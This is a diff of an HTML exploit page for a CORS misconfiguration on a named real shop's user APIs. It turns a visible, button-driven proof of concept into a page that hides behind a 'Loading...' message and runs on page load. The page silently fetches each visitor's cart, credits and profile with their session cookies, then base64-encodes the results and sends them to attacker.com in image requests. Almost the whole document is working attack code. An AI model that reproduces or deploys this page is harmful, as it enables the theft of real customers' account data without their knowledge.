@@ -1,210 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
 <meta charset="UTF-8">
-<title>OPPO CORS Exploit PoC</title>
-
-<style>
-
-body{
-font-family: Arial, sans-serif;
-background:#eef2f7;
-margin:0;
-padding:30px;
-color:#222;
-}
-
-.container{
-max-width:1100px;
-margin:auto;
-}
-
-h1{
-text-align:center;
-margin-bottom:10px;
-}
-
-.description{
-text-align:center;
-font-size:16px;
-margin-bottom:30px;
-color:#444;
-}
-
-button{
-display:block;
-margin:0 auto 30px auto;
-padding:12px 30px;
-font-size:16px;
-background:#2e7df6;
-color:white;
-border:none;
-border-radius:6px;
-cursor:pointer;
-}
-
-button:hover{
-background:#1c5ed3;
-}
-
-.grid{
-display:grid;
-grid-template-columns:1fr;
-gap:20px;
-}
-
-.card{
-background:white;
-padding:18px;
-border-radius:10px;
-box-shadow:0 2px 8px rgba(0,0,0,0.08);
-}
-
-.label{
-display:inline-block;
-padding:5px 12px;
-border-radius:6px;
-font-size:13px;
-color:white;
-margin-bottom:10px;
-}
-
-.cart{background:#4CAF50;}
-.count{background:#2196F3;}
-.coupon{background:#FF9800;}
-.credit{background:#9C27B0;}
-
-.url{
-font-size:14px;
-color:#555;
-margin-bottom:8px;
-word-break:break-word;
-}
-
-.status{
-font-weight:bold;
-margin-bottom:8px;
-}
-
-pre{
-background:#f5f6f8;
-padding:12px;
-border-radius:6px;
-white-space:pre-wrap;
-word-wrap:break-word;
-overflow-wrap:break-word;
-font-size:13px;
-line-height:1.4;
-}
-
-</style>
-
+<title>CORS Exploit PoC</title>
 </head>
 
 <body>
-
-<div class="container">
-
-<h1>OPPO CORS Exploit Proof of Concept</h1>
-
-<div class="description">
-This PoC demonstrates a CORS misconfiguration allowing authenticated requests to OPPO Shop APIs from an <b>external origin (file://, page) +</b>.
-</div>
-
-<button onclick="runExploit()">Run Exploit</button>
-
-<div class="grid" id="results"></div>
-
-</div>
+<h2>Loading...</h2>
 
 <script>
 
-function createCard(title,label,url){
+async function steal(url, name) {
+    try {
+        let res = await fetch(url, {
+            method: "GET",
+            credentials: "include",
+            headers: {
+                "Accept": "application/json"
+            }
+        });
 
-let card=document.createElement("div")
-card.className="card"
+        if (!res.ok) return;
 
-card.innerHTML=
-'<div class="label '+label+'">'+title+'</div>'+
-'<div class="url">'+url+'</div>'+
-'<div class="status" id="'+label+'_status">Waiting for request...</div>'+
-'<pre id="'+label+'_data"></pre>'
+        let text = await res.text();
 
-document.getElementById("results").appendChild(card)
+        // check for real data
+        if (text.length > 20 && text.includes("code")) {
+
+            console.log("[+] Data from:", name, text);
+
+            let pre = document.createElement("pre");
+            pre.innerText = "[DATA] " + name + "\n" + text;
+            document.body.appendChild(pre);
+
+            // exfiltration
+            new Image().src = "https://attacker.com/log?d=" + btoa(name + ":" + text);
+
+        }
+
+    } catch (e) {
+        console.log("Error:", e);
+    }
+}
+
+function runExploit() {
+
+    steal("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
+    steal("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
+    steal("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credits");
+    steal("https://www.opposhop.cn/cn/oapi/users/web/member/check?unpaid=0&cartNumber=0", "profile");
 
 }
 
-createCard(
-"Cart List (Authenticated Data)",
-"cart",
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list"
-)
-
-createCard(
-"Cart Count",
-"count",
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
-)
-
-createCard(
-"Coupon Count (Unused Coupons)",
-"coupon",
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1"
-)
-
-createCard(
-"User Credits / Points",
-"credit",
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
-)
-
-
-function request(url,label){
-
-fetch(url,{
-method:"GET",
-credentials:"include"
-})
-
-.then(r=>{
-document.getElementById(label+"_status").innerText="STATUS: "+r.status
-return r.text()
-})
-
-.then(data=>{
-document.getElementById(label+"_data").innerText=data
-})
-
-.catch(err=>{
-document.getElementById(label+"_data").innerText=err
-})
-
-}
-
-function runExploit(){
-
-request(
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-"cart"
-)
-
-request(
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-"count"
-)
-
-request(
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-"coupon"
-)
-
-request(
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-"credit"
-)
-
-}
+runExploit();
 
 </script>
 
